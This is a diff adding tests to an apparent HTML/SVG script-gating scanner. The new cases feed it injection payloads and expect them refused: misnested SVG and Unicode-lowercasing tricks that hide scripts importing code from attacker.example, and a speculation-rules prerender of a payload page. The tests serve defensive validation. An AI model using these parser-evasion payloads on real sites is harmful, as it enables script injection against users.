@@ -255,6 +255,20 @@ test("documents are tokenised conservatively: comments, declarations, contexts, 
   assert.equal(scan('<meta charset="UTF-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name=viewport content=x>').scripts.length, 0);
   throwsGate(() => scan('<?xml version="1.0" encoding="ISO-2022-JP"?><svg/>', { xml: true }), /XML declaration encoding "ISO-2022-JP"/);
   assert.equal(scan('<?xml version="1.0" encoding="UTF-8"?><svg/>', { xml: true }).scripts.length, 0);
+  // Inside <svg> markup must nest: a browser pops the svg element for an HTML ancestor's end tag, after which
+  // "<script/>" is an HTML script whose body runs; an unmatched end tag inside <svg> is refused either way.
+  throwsGate(() => scan('<div><svg></div><script/>import("https://attacker.example/matcher.js")</script></svg>'), /misnested markup is refused/);
+  throwsGate(() => scan("<svg><g></svg>"), /<\/svg> inside <svg> does not close the innermost open <g>/);
+  throwsGate(() => scan("<svg><g><rect></g></svg>"), /misnested markup is refused/);
+  assert.equal(scan('<svg><g><path d="M0 0"/><rect></rect></g><svg><g/></svg></svg><div>after</div>').scripts.length, 0);
+  assert.deepEqual(scan("<svg><g><script>svgCode()</script></g></svg>").scripts.map((s) => s.body), ["svgCode()"]); // a foreign script is consumed with its end tag
+  // No Unicode-lowercased copy is indexed with original offsets: twelve U+0130 (each lowercases to two code
+  // units) would shift every marker after them so that a real <script> looked like a comment.
+  const dotted = "İ".repeat(12);
+  assert.equal(scan(`<style>${dotted}<!--</style><script src="https://attacker.example/p.js?-->"></script>`).scripts.length, 1);
+  assert.equal(scan(`<p>${dotted}</p><script>x</script>`).scripts[0].body, "x");
+  throwsGate(() => scan("<![cdata[ x ]]>"), /unsupported declaration/); // not CDATA to a browser either; refused as a declaration
+  throwsGate(() => scan('<?XML version="1.0"?><svg/>', { xml: true }), /processing instructions/); // the XML declaration is lower-case only
   throwsGate(() => scan('<!-- <script src="/a.js"> --><script src="https://cdn.example.invalid/x.js"></script>'), /comment contains markup/);
   throwsGate(() => scan("<!-- a > b -->"), /comment contains markup/);
   throwsGate(() => scan("<!-- never closed"), /unterminated comment/);
@@ -356,6 +370,7 @@ test("HTML documents: known sources, pinned inline scripts, inert data blocks, b
     assert.equal(judge('<svg><script type="text/plain">x</script></svg>').data, 1); // an explicit inert type stays inert
     throwsGate(() => judge('<svg><script type="module">x</script></svg>'), /inline script 1 is not pinned/);
     assert.equal(judge('<script type="text/template">{"dep":"react"}</script>').data, 1);
+    throwsGate(() => judge('<script type="speculationrules">{"prerender":[{"source":"list","urls":["/other-app/payload.html"]}]}</script>'), /speculation rules are refused/);
     // Tokenizer states and SVG sources.
     throwsGate(() => judge('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
     throwsGate(() => judge('<style></stylex><script type="application/json"></style><script>globalThis.pwned=1</script>'), /inline script 1 is not pinned/);
@@ -713,6 +728,9 @@ test("the deployment build's output must equal this build's chunks and pins (--v
     await refused(inHtml("<meta charset=iso-2022-jp>"), /declares the charset "iso-2022-jp"/);
     await refused(() => writeFileSync(join(dist, "index.html"), Buffer.concat([Buffer.from(html.replace("</body>", "<p>")), Buffer.from([0x1b]), Buffer.from("$B</p></body>")])), /control character U\+001B/);
     await refused(() => writeFileSync(join(dist, "evil.svg"), '<?xml version="1.0" encoding="ISO-2022-JP"?><svg xmlns="http://www.w3.org/2000/svg"/>'), /XML declaration encoding/);
+    await refused(inHtml('<div><svg></div><script/>import("https://attacker.example/matcher.js")</script></svg>'), /misnested markup is refused/);
+    await refused(inHtml(`<style>${"İ".repeat(12)}<!--</style><script src="https://attacker.example/p.js?-->"></script>`), /external script/);
+    await refused(inHtml('<script type="speculationrules">{"prerender":[{"source":"list","urls":["/other-app/payload.html"]}]}</script>'), /speculation rules are refused/);
     // A refresh to an XML target is judged through the target itself, which may carry no script.
     await refused(() => { writeFileSync(join(dist, "evil.svg"), "<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>"); inHtml('<meta http-equiv="refresh" content="0; url=evil.svg">')(); }, /evil\.svg is an XML document carrying a <script>/);
     await refused(inHtml('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 2 is not pinned/);
